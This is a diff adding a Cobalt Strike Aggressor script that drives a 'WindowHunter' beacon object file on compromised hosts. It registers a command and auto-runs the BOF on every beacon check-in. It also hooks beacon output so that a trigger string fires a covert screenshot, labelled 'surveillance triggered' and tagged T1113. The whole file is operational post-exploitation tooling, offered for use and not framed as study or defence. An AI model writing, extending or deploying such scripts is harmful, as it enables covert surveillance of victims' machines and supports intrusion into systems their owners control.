@@ -1,0 +1,73 @@
+
+@alert = @("google");
+set BEACON_OUTPUT{
+
+	if(strlen($2) >= 29){
+		$trigger = substr($2,17,29);
+
+		if ($trigger eq "__TW_@L3R7__")
+		{
+			btask($1,"surveillance triggered");
+			spy($1);
+			return;
+			
+		}else{
+			return $2;
+		}
+		}else{
+			return $2;
+	}
+}
+
+set BEACON_CHECKIN{
+	return;
+}
+
+sub spy{
+	bscreenshot($1);
+	#spy stuff goes here
+}
+
+#Register command
+beacon_command_register(
+    "windowhunter",
+    "windowhunter",
+    "Use: windowhunter"
+);
+
+alias windowhunter {
+    local('$bid $barch $handle $data $args $target_pid');
+    $bid = $1;
+    # figure out the arch of this session
+    $barch  = barch($bid);
+
+    # read in the right BOF file
+    $handle = openf(script_resource("WindowHunter. $+ $barch $+ .obj"));
+    $data = readb($handle, -1);
+    closef($handle);
+    
+    $args   = bof_pack($bid);
+
+    # announce what we're doing
+    btask($bid, "Running WindowHunter by (@codex_tf2)", "T1113");
+    # execute it.
+    beacon_inline_execute($bid, $data, "go", $args);
+}
+
+on beacon_checkin {
+    local('$bid $barch $handle $data $args $target_pid');
+    $bid = $1;
+    # figure out the arch of this session
+    $barch  = barch($bid);
+
+    # read in the right BOF file
+    $handle = openf(script_resource("WindowHunter. $+ $barch $+ .obj"));
+    $data = readb($handle, -1);
+    closef($handle);
+    
+    $args   = bof_pack($bid);
+
+    # execute it.
+    beacon_inline_execute($bid, $data, "go", $args);
+}
+
